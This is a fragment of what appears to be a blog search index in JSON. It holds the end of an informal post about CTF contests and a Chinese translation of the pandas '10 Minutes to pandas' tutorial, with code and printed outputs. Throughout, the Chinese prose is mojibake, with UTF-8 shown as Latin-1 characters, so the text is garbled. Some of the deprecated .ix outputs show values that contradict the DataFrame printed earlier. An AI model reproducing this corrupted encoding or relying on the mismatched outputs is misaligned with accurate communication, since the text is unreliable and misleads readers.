ä¸‹çš„ä¸åŒç«¯å£ï¼Œä¸åƒä¹‹å‰è§è¿‡çš„åŠ¨æ€åŸŸåï¼Œå¯èƒ½æ¯”è¾ƒå®¹æ˜“è¢«æ‰«æï¼Œä»è€Œå®¹æ˜“è¢«æ”»å‡»å§ï¼ˆçŒœçš„ã€‚ çœ‹äº†ä¸€ä¸‹å¹³å°æ˜¯ç›´æ¥ç”¨ Gunicorn æ­å»ºçš„ web æœåŠ¡å°±ä¸Šå…¬ç½‘äº†ï¼Œæ²¡å¥— Nginx ä¹‹ç±»çš„åä»£ï¼Œä¹Ÿæ²¡åŠ  WAF æ¥ç€ã€‚ä¸è¿‡æ²¡æ€ä¹ˆäº†è§£ä¹Ÿä¸å¤§æ¸…æ¥š Gunicorn åº”å¯¹é«˜å¹¶å‘çš„èƒ½åŠ›å¦‚ä½•ã€‚ æ€»ä½“æ„Ÿè§‰è¿™æ¬¡ CTF è¿ç»´èµ› é¢˜ç›®å¥½å¤šå•Šï¼Œéš¾åº¦å¥½å¤§å•Šï¼ŒåŸºæœ¬æ²¡è§è¿‡çš„å¥—è·¯å‘¢ã€‚é¢˜ç›®è´¨é‡è¿˜ä¸é”™ï¼Œå°±æ˜¯å•¥éƒ½ä¸ä¼šï¼Œå˜¤å˜¤å˜¤ã€‚ è™½è¯´ç®—æ˜¯ä¸šä½™ç©ç©çš„ï¼Œä½†ä¹Ÿæƒ³å¥½å¥½å­¦ç‚¹ä¸œè¥¿å‘¢ã€‚ çœ‹äº†å¤§ä½¬ä»¬çš„WPï¼Œè†œä¸€æ³¢ã€‚ é¡ºä¾¿å†è†œä¸€ä¸‹ç”¨å­¦ç”Ÿæœºçµæ´»åº”å¯¹é«˜å¹¶å‘çš„è¿ç»´å¤§ä½¬ã€‚ å‘¨æ—¥è¿˜æ‰“äº†ä¸ªè™ç¬¦ CTFï¼ˆ2020æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ï¼‰ï¼Œå‘ç°é¢˜ç›®å¤§éƒ½æ–°é²œå‡ºç‚‰çš„ã€‚æœç„¶çˆ†é›¶ï¼Œé¢˜ç›®åšåˆ°è‡ªé—­ã€‚ã€‚ Misc é¢˜ä¸€å †å¯†ç é¢˜ï¼Œå“‡å‘œä¸ä¼šåšâ€¦â€¦ æœ‰é“ python é€†å‘é¢˜disasmï¼Œç»™äº†å¯¹å­—èŠ‚ç åç¼–è¯‘åå¾—åˆ°çš„ä»£ç ï¼ˆå¯ä»¥åˆ©ç”¨dis.diså¸®åŠ©åˆ†æï¼‰ï¼Œå“‡ç¬¬ä¸€æ¬¡çœ‹åˆ°äº† python çš„åº•å±‚å®ç°ï¼ŒçœŸå°±å’Œæ±‡ç¼–å·®ä¸å¤šï¼Œæ„Ÿè§‰æŒºèƒ½å¸®åŠ©ç†è§£ Py åŸç†çš„ã€‚çœ‹äº†å‡ ç¯‡æ–‡ç« äº†è§£äº†ä¸€ä¸‹ï¼Œç„¶è€Œæ‰‹åŠ¨é€†å‘åˆ°è‡ªé—­éƒ½æ²¡åˆ†æä¸å®Œï¼Œæœ€åå°±æ”¾å¼ƒäº†ã€‚ A Python Interpreter Written in Python æ­»ç£•pythonå­—èŠ‚ç -æ‰‹å·¥è¿˜åŸpythonæºç  Web é¢˜ç”¨ nodejs ä¼ªé€  PHP å¯è¿˜è¡Œï¼Œç„¶è€ŒçœŸå¥½ï¼Œéƒ½æ˜¯æˆ‘ä¸ä¼šçš„ã€‚ ä¸å†™äº†ä¸å†™äº†ã€‚ ç­‰åé¢æœ‰æœºä¼šå†æ¥å¤ç°å§ã€‚ ï¼ˆæºœäº†æºœäº†","path":"2020/04/21/CTF_2020Ha1cyonCTF/"},{"title":"æ•°æ®ç§‘å­¦ | ååˆ†é’Ÿå…¥é—¨pandas/å¸¸ç”¨æ–¹æ³•ç¬”è®°","text":"0x00 å‰è¨€æœ€è¿‘å¯¹æ•°æ®ç§‘å­¦æœ‰ç‚¹æ„Ÿå…´è¶£ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨ python ä¸­ç”¨æ¥åšæ•°æ®å¤„ç†å¸¸ç”¨çš„æœ‰ numpyã€pandas ç­‰æ¨¡å—ï¼Œå®ƒä»¬åŠŸèƒ½éå¸¸å¼ºå¤§ã€‚ è€ƒè™‘åˆ°æœ‰é¡¹ç›®æ­£å¥½è¦ç”¨åˆ° pandasï¼Œè¿™æ¬¡å°±æ¥å­¦ä¸€ä¸‹å§ã€‚ï¼ˆæŒºä¹…ä¹‹å‰å°±æƒ³å­¦çš„ï¼Œä¸€ç›´å’• çœ‹åˆ°ç½‘ä¸Šæ¨èäº†å®˜æ–¹çš„ 10 Minutes to pandasï¼Œå°±å»çœ‹äº†ä¸€ä¸‹ï¼Œç¿»è¯‘äº†ä¸€ä¸‹å®˜æ–¹çš„æ•™ç¨‹ï¼Œè‡ªå·±è·‘äº†ä»£ç ï¼Œé¡ºä¾¿å†è®°äº†ç‚¹ç¬”è®°å§ã€‚ ä¸‹é¢çš„å†…å®¹ä¸»è¦å‚è€ƒçš„æ˜¯10 Minutes to pandasï¼ˆç„¶è€Œçœ‹äº†ä¸€æ™šä¸Šï¼‰ï¼Œè¿è¡Œç¯å¢ƒä¸º Jupyter Notebookã€‚ è¿™ç¯‡åšå®¢ä¹Ÿæ˜¯åœ¨ä» Jupyter Notebook é‡Œå¯¼å‡ºçš„ markdown åŸºç¡€ä¸Šå®Œæˆçš„ï¼ŒæŒºæ–¹ä¾¿çš„å‘¢ã€‚ï¼ˆæœ‰äº›åœ°æ–¹å¯èƒ½ç”±äºåšå®¢æ ·å¼çš„åŸå› æ˜¾ç¤ºä¼šæœ‰ç‚¹é—®é¢˜ï¼Œå‡‘åˆç€çœ‹ä¸€çœ‹å§ã€‚ åé¢æœ‰ç©ºå†æ•´ç†ä¸€ä¸‹ï¼Œæ”¾ä¸ª Jupyter Notebook çš„.ipynbç‰ˆæœ¬å§ã€‚ â€”-&gt;è¯¦è§æ–‡æœ«çš„æ›´æ–°ï¼ 0x01 å¯¼å…¥æ¨¡å—import pandas as pd import matplotlib.pyplot as plt import numpy as np è¿™äº›éƒ½æ˜¯å¸¸ç”¨åˆ«åäº†å‘¢ï¼ˆ 0x02 åˆ›å»ºå¯¹è±¡ Object Creationä¼ é€’ä¸€ä¸ªlistå¯¹è±¡æ¥åˆ›å»ºä¸€ä¸ªSeriesï¼Œpandasä¼šé»˜è®¤åˆ›å»ºæ•´å‹ç´¢å¼•(index)ã€‚ s = pd.Series([1,3,5,np.nan,6,8]) s 0 1.0 1 3.0 2 5.0 3 NaN 4 6.0 5 8.0 dtype: float64 ä¼ é€’ä¸€ä¸ªnumpy arrayï¼Œæ—¶é—´ç´¢å¼•ä»¥åŠåˆ—æ ‡ç­¾æ¥åˆ›å»ºä¸€ä¸ªDataFrame dates = pd.date_range('20200416', periods=6) dates DatetimeIndex(['2020-04-16', '2020-04-17', '2020-04-18', '2020-04-19', '2020-04-20', '2020-04-21'], dtype='datetime64[ns]', freq='D') df = pd.DataFrame(np.random.randn(6,4), index=dates, columns=list('ABCD')) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 ä¼ é€’ä¸€ä¸ªèƒ½å¤Ÿè¢«è½¬æ¢æˆç±»ä¼¼åºåˆ—ç»“æ„çš„å­—å…¸å¯¹è±¡æ¥åˆ›å»ºä¸€ä¸ªDataFrame df2 = pd.DataFrame({ 'A' : 1., 'B' : pd.Timestamp('20200416183800'), 'C' : pd.Series(1,index=list(range(4)),dtype='float32'), 'D' : np.array([3] * 4,dtype='int32'), 'E' : pd.Categorical([\"test\",\"train\",\"test\",\"train\"]), 'F' : 'foo' }) df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D E F 0 1.0 2020-04-16 18:38:00 1.0 3 test foo 1 1.0 2020-04-16 18:38:00 1.0 3 train foo 2 1.0 2020-04-16 18:38:00 1.0 3 test foo 3 1.0 2020-04-16 18:38:00 1.0 3 train foo æŸ¥çœ‹ä»–ä»¬çš„æ•°æ®ç±»å‹(dtypes). df2.dtypes A float64 B datetime64[ns] C float32 D int32 E category F object dtype: object åœ¨ IPython é‡Œè¾“å…¥ df2.ï¼ŒæŒ‰ä¸‹ TAB é”®ï¼Œä¼šæœ‰å¸¸ç”¨çš„ä»£ç æç¤ºã€‚ è¿™é‡Œæˆ‘æ˜¯åœ¨ Jupyter Notebook ä¸­è·‘ï¼Œä¹Ÿæœ‰ç±»ä¼¼æ•ˆæœã€‚ä¸ºäº†æ–¹ä¾¿å±•ç¤ºè¿™é‡Œç”¨diræ¥åˆ—å‡ºæ¥å§ã€‚ dir(df2) ['A', 'B', 'C', 'D', 'E', 'F', 'T', ######################...########### 'to_feather', 'to_gbq', 'to_hdf', 'to_html', 'to_json', 'to_latex', 'to_msgpack', 'to_numpy', 'to_panel', 'to_parquet', 'to_period', 'to_pickle', 'to_records', 'to_sparse', 'to_sql', 'to_stata', 'to_string', 'to_timestamp', 'to_xarray', 'transform', 'transpose', 'truediv', 'truncate', 'tshift', 'tz_convert', 'tz_localize', 'unstack', 'update', 'values', 'var', 'where', 'xs'] 0x03 æŸ¥çœ‹æ•°æ® Viewing DataæŸ¥çœ‹ frame ä¸­å¤´éƒ¨å’Œå°¾éƒ¨çš„è¡Œ df.head() # æŸ¥çœ‹å‰äº”è¡Œæ•°æ® .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 df.head(2) # å‰ä¸¤è¡Œ .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 df.tail(3) # å€’æ•°ä¸‰è¡Œ .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 æ˜¾ç¤ºç´¢å¼•ã€åˆ—å’Œåº•å±‚çš„(underlying) numpy æ•°æ® df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 df.index DatetimeIndex(['2020-04-16', '2020-04-17', '2020-04-18', '2020-04-19', '2020-04-20', '2020-04-21'], dtype='datetime64[ns]', freq='D') df2.index Int64Index([0, 1, 2, 3], dtype='int64') df.columns Index(['A', 'B', 'C', 'D'], dtype='object') df.values array([[-0.22808386, 0.71252123, 0.74337822, 0.52682341], [-0.42392275, 0.56434629, -2.31893066, 0.08093058], [-2.03224294, 2.04682736, 1.17661398, -0.3655562 ], [-1.20000469, 1.10999124, -1.52780407, 1.06864157], [-0.53503099, 1.35142044, 0.90786509, -1.07401348], [-0.61473412, 0.02714293, -0.42087502, -0.33381946]]) df2.values array([[1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'test', 'foo'], [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'train', 'foo'], [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'test', 'foo'], [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'train', 'foo']], dtype=object) print(type(df)) print(type(df.columns)) print(type(df.values)) &lt;class 'pandas.core.frame.DataFrame'&gt; &lt;class 'pandas.core.indexes.base.Index'&gt; &lt;class 'numpy.ndarray'&gt; describe å‡½æ•°å¯¹äºæ•°æ®çš„å¿«é€Ÿç»Ÿè®¡æ±‡æ€» df.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D count 6.000000 6.000000 6.000000 6.000000 mean -0.839003 0.968708 -0.239959 -0.016166 std 0.669679 0.699208 1.435586 0.751411 min -2.032243 0.027143 -2.318931 -1.074013 25% -1.053687 0.601390 -1.251072 -0.357622 50% -0.574883 0.911256 0.161252 -0.126444 75% -0.451700 1.291063 0.866743 0.415350 max -0.228084 2.046827 1.176614 1.068642 df2.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A C D count 4.0 4.0 4.0 mean 1.0 1.0 3.0 std 0.0 0.0 0.0 min 1.0 1.0 3.0 25% 1.0 1.0 3.0 50% 1.0 1.0 3.0 75% 1.0 1.0 3.0 max 1.0 1.0 3.0 å¯¹æ•°æ®è¿›è¡Œè½¬ç½®(Transposing) df.T .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; 2020-04-16 00:00:00 2020-04-17 00:00:00 2020-04-18 00:00:00 2020-04-19 00:00:00 2020-04-20 00:00:00 2020-04-21 00:00:00 A -0.228084 -0.423923 -2.032243 -1.200005 -0.535031 -0.614734 B 0.712521 0.564346 2.046827 1.109991 1.351420 0.027143 C 0.743378 -2.318931 1.176614 -1.527804 0.907865 -0.420875 D 0.526823 0.080931 -0.365556 1.068642 -1.074013 -0.333819 df2.T .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; 0 1 2 3 A 1 1 1 1 B 2020-04-16 18:38:00 2020-04-16 18:38:00 2020-04-16 18:38:00 2020-04-16 18:38:00 C 1 1 1 1 D 3 3 3 3 E test train test train F foo foo foo foo æŒ‰ç…§æŸä¸€åæ ‡è½´è¿›è¡Œæ’åº df.sort_index(axis=1, ascending=False) # é™åº .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; D C B A 2020-04-16 0.526823 0.743378 0.712521 -0.228084 2020-04-17 0.080931 -2.318931 0.564346 -0.423923 2020-04-18 -0.365556 1.176614 2.046827 -2.032243 2020-04-19 1.068642 -1.527804 1.109991 -1.200005 2020-04-20 -1.074013 0.907865 1.351420 -0.535031 2020-04-21 -0.333819 -0.420875 0.027143 -0.614734 df.sort_index(axis=1, ascending=True) # å‡åºï¼ˆé»˜è®¤ï¼‰ .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 df.sort_index(axis=0, ascending=False) # ä»¥ç¬¬0è½´ï¼ˆè¡Œï¼‰æ¥æ’åºï¼Œé™åº .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-16 -0.228084 0.712521 0.743378 0.526823 æŒ‰å€¼è¿›è¡Œæ’åºï¼Œé»˜è®¤ä¸ºå‡åº df.sort_values(by='B') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 0x04 é€‰æ‹©æ•°æ® Selection æ³¨æ„ï¼š è™½ç„¶æ ‡å‡†çš„ Python/Numpy çš„é€‰æ‹©å’Œè®¾ç½®è¡¨è¾¾å¼éƒ½éå¸¸æ˜“æ‡‚ä¸”æ–¹ä¾¿ç”¨äºäº¤äº’ä½¿ç”¨ï¼Œä½†æ˜¯ä½œä¸ºå·¥ç¨‹ä½¿ç”¨çš„ä»£ç ï¼Œæ¨èä½¿ç”¨ç»è¿‡ä¼˜åŒ–çš„ pandas æ•°æ®è®¿é—®æ–¹æ³•ï¼š .at, .iat, .loc, .iloc å’Œ .ixã€‚ 0x04-1 è·å– Gettingé€‰æ‹©ä¸€ä¸ªå•ç‹¬çš„åˆ—ï¼Œè¿™å°†ä¼šè¿”å›ä¸€ä¸ª Seriesï¼Œç­‰æ•ˆäº df.A df['A'] 2020-04-16 -0.228084 2020-04-17 -0.423923 2020-04-18 -2.032243 2020-04-19 -1.200005 2020-04-20 -0.535031 2020-04-21 -0.614734 Freq: D, Name: A, dtype: float64 é€šè¿‡[]è¿›è¡Œé€‰æ‹©ï¼Œå¯ä»¥ç”¨æ¥è¡Œè¿›è¡Œåˆ‡ç‰‡(slice) df[1:3] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 df['20200418':'20200420'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 0x4-2 é€šè¿‡æ ‡ç­¾é€‰æ‹© Selection by Labelåˆ©ç”¨ pandas çš„ .loc, .at æ–¹æ³• ä½¿ç”¨æ ‡ç­¾æ¥è·å–ä¸€ä¸ªäº¤å‰çš„åŒºåŸŸ dates[0] Timestamp('2020-04-16 00:00:00', freq='D') df.loc[dates[0]] A -0.228084 B 0.712521 C 0.743378 D 0.526823 Name: 2020-04-16 00:00:00, dtype: float64 ç”¨æ ‡ç­¾æ¥åœ¨å¤šä¸ªè½´ä¸Šè¿›è¡Œé€‰æ‹© df.loc[:,['A','B']] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B 2020-04-16 -0.228084 0.712521 2020-04-17 -0.423923 0.564346 2020-04-18 -2.032243 2.046827 2020-04-19 -1.200005 1.109991 2020-04-20 -0.535031 1.351420 2020-04-21 -0.614734 0.027143 åˆ©ç”¨æ ‡ç­¾æ¥åˆ‡ç‰‡ æ³¨æ„æ­¤å¤„çš„åˆ‡ç‰‡ä¸¤ç«¯éƒ½åŒ…å«ï¼ˆå·¦é—­å³é—­ï¼‰ df.loc['20200418':'20200420',['A','B']] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B 2020-04-18 -2.032243 2.046827 2020-04-19 -1.200005 1.109991 2020-04-20 -0.535031 1.351420 df.loc[dates[2]:,:'C'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C 2020-04-18 -2.032243 2.046827 1.176614 2020-04-19 -1.200005 1.109991 -1.527804 2020-04-20 -0.535031 1.351420 0.907865 2020-04-21 -0.614734 0.027143 -0.420875 å¯¹äºè¿”å›çš„å¯¹è±¡è¿›è¡Œç»´åº¦ç¼©å‡ df.loc['20200419',['A','B']] A -1.200005 B 1.109991 Name: 2020-04-19 00:00:00, dtype: float64 è·å–ä¸€ä¸ªæ ‡é‡ df.loc[dates[2],'A'] -2.0322429408627056 å¿«é€Ÿè®¿é—®ä¸€ä¸ªæ ‡é‡ï¼ˆä¸ä¸Šä¸€ä¸ªæ–¹æ³•ç­‰ä»·ï¼‰ df.at[dates[2],'A'] -2.0322429408627056 0x04-3 é€šè¿‡ä½ç½®è¿›è¡Œé€‰æ‹© Selection by Positionåˆ©ç”¨çš„æ˜¯ pandas é‡Œçš„ .iloc, .iat æ–¹æ³• é€šè¿‡ä¼ é€’æ•´æ•°å€¼è¿›è¡Œä½ç½®é€‰æ‹© df.iloc[3] A -1.200005 B 1.109991 C -1.527804 D 1.068642 Name: 2020-04-19 00:00:00, dtype: float64 df.iloc[:,2] # [è¡Œï¼Œåˆ—] æˆ– [ç¬¬0ç»´ï¼Œç¬¬1ç»´] 2020-04-16 0.743378 2020-04-17 -2.318931 2020-04-18 1.176614 2020-04-19 -1.527804 2020-04-20 0.907865 2020-04-21 -0.420875 Freq: D, Name: C, dtype: float64 åˆ©ç”¨æ•°å€¼è¿›è¡Œåˆ‡ç‰‡ï¼Œç±»ä¼¼äº numpy/python æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œçš„åˆ‡ç‰‡æ˜¯æ™®é€šçš„åˆ‡ç‰‡ï¼Œå³å·¦é—­å³å¼€ã€‚ df.iloc[3:5,0:2] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B 2020-04-19 -1.200005 1.109991 2020-04-20 -0.535031 1.351420 å¯ä»¥æŒ‡å®šä¸€ä¸ªä½ç½®çš„åˆ—è¡¨æ¥é€‰æ‹©æ•°æ®åŒºåŸŸ df.iloc[[1,2,4],[0,2]] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A C 2020-04-17 -0.423923 -2.318931 2020-04-18 -2.032243 1.176614 2020-04-20 -0.535031 0.907865 å¯¹è¡Œè¿›è¡Œåˆ‡ç‰‡ df.iloc[1:3,:] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 å¯¹åˆ—è¿›è¡Œåˆ‡ç‰‡ df.iloc[:,1:3] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; B C 2020-04-16 0.712521 0.743378 2020-04-17 0.564346 -2.318931 2020-04-18 2.046827 1.176614 2020-04-19 1.109991 -1.527804 2020-04-20 1.351420 0.907865 2020-04-21 0.027143 -0.420875 åˆ©ç”¨ä½ç½®å¿«é€Ÿå¾—åˆ°ä¸€ä¸ªä½ç½®å¯¹åº”çš„å€¼ df.iloc[1,1] 0.5643462917985026 df.iat[1,1] 0.5643462917985026 .ix ç”¨æ³•ï¼ˆDeprecatedï¼‰df.ix[] æ—¢å¯ä»¥é€šè¿‡æ•´æ•°ç´¢å¼•è¿›è¡Œæ•°æ®é€‰å–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ ‡ç­¾ç´¢å¼•è¿›è¡Œæ•°æ®é€‰å–ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œdf.ix[] æ˜¯ df.loc[] å’Œ df.iloc[] çš„åŠŸèƒ½é›†åˆï¼Œä¸”åœ¨åŒä¹‰è¯é€‰å–ä¸­ï¼Œå¯ä»¥åŒæ—¶ä½¿ç”¨æ•´æ•°ç´¢å¼•å’Œæ ‡ç­¾ç´¢å¼•ã€‚ è¿™ä¸ªæ–¹æ³•åœ¨å®˜æ–¹çš„ 10 Minutes to pandas ä¸­æ²¡æœ‰ä¸“é—¨è¯´æ˜ï¼Œä¸å»ºè®®ç”¨è¿™ä¸€æ–¹æ³•ï¼Œè¯·ç”¨.locå’Œ.ilocæ¥ç´¢å¼•ï¼Œé‚£è¿™é‡Œå°±æä¸€ä¸‹å¥½äº†ã€‚ df.ix[1,'A'] D:\\Programs\\Anaconda\\lib\\site-packages\\ipykernel_launcher.py:1: DeprecationWarning: .ix is deprecated. Please use .loc for label based indexing or .iloc for positional indexing See the documentation here: http://pandas.pydata.org/pandas-docs/stable/indexing.html#ix-indexer-is-deprecated \"\"\"Entry point for launching an IPython kernel. -1.363418018143355 df.ix[dates[1:3],[0,2,3]] D:\\Programs\\Anaconda\\lib\\site-packages\\ipykernel_launcher.py:1: DeprecationWarning: .ix is deprecated. Please use .loc for label based indexing or .iloc for positional indexing See the documentation here: http://pandas.pydata.org/pandas-docs/stable/indexing.html#ix-indexer-is-deprecated \"\"\"Entry point for launching an IPython kernel. .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A C D 2020-04-17 -11.332834 7.659436 -20.925183 2020-04-18 -11.040688 6.867701 -20.157355 ä» DeprecationWarning çœ‹æ¥çš„ç¡®å·²ç» deprecated äº†ï¼Œé‚£å°±ä¸è¦ç”¨äº†ï¼ 0x04-4 å¸ƒå°”ç´¢å¼• Boolean Indexingä½¿ç”¨ä¸€ä¸ªå•ç‹¬åˆ—çš„å€¼æ¥é€‰æ‹©æ•°æ® df[df.D &gt; 0] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 åˆ©ç”¨å¸ƒå°”æ¡ä»¶ä»ä¸€ä¸ª DataFrame ä¸­é€‰æ‹©æ•°æ® df&gt;0 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 False True True True 2020-04-17 False True False True 2020-04-18 False True True False 2020-04-19 False True False True 2020-04-20 False True True False 2020-04-21 False True False False df[df &gt; 0] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 NaN 0.712521 0.743378 0.526823 2020-04-17 NaN 0.564346 NaN 0.080931 2020-04-18 NaN 2.046827 1.176614 NaN 2020-04-19 NaN 1.109991 NaN 1.068642 2020-04-20 NaN 1.351420 0.907865 NaN 2020-04-21 NaN 0.027143 NaN NaN ä½¿ç”¨ isin() æ–¹æ³•æ¥è¿‡æ»¤æ•°æ® (is in) df3 = df.copy() df3['E'] = ['one', 'one','two','three','four','three'] df3 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D E 2020-04-16 -0.228084 0.712521 0.743378 0.526823 one 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 one 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 two 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 three 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 four 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 three df3[df3['E'].isin(['two','four'])] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D E 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 two 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 four 0x05 è®¾ç½®æ•°æ® Settingè®¾ç½®ä¸€ä¸ªæ–°çš„åˆ—ï¼Œè‡ªåŠ¨æŒ‰ç…§ç´¢å¼•æ¥å¯¹å…¶æ•°æ® s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range('20200416', periods=6)) s1 2020-04-16 1 2020-04-17 2 2020-04-18 3 2020-04-19 4 2020-04-20 5 2020-04-21 6 Freq: D, dtype: int64 